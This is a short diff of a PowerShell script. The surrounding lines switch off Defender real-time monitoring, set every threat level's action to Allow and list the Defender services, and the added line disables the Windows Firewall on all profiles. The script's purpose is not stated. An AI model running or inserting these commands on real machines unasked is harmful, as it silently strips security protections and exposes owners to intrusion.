@@ -51,6 +51,7 @@ Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
 Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
+Set-NetFirewallProfile -All -Enabled false
 $need_reboot = $false
 $counter = 0
 $svc_list = @("WdNisSvc", "WinDefend", "Sense")
